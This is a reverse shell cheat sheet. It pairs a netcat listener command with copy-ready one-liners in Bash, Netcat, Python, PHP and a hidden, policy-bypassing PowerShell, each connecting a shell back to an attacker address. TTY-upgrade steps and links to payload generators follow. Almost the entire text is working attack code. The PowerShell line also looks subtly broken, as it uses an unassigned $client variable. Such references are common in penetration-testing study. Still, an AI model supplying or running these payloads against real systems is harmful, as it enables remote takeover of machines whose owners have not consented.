# Reverse Shell Cheat Sheet

Set a listener first: `nc -lvnp <PORT>`

## Bash

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

## Netcat

```
nc -e /bin/sh <ATTACKER_IP> <PORT>
# if -e is not supported:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

## Python

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## PHP

```
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## PowerShell (Windows)

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Upgrading a shell to a full TTY (Linux)

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then, in the new shell:
export TERM=xterm
# Ctrl-Z to background, then on attacker box:
stty raw -echo; fg
# press Enter twice, then:
reset
```

## Reference

Full generator/payload list: [revshells.com](https://revshells.com/) and [PayloadsAllTheThings — reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
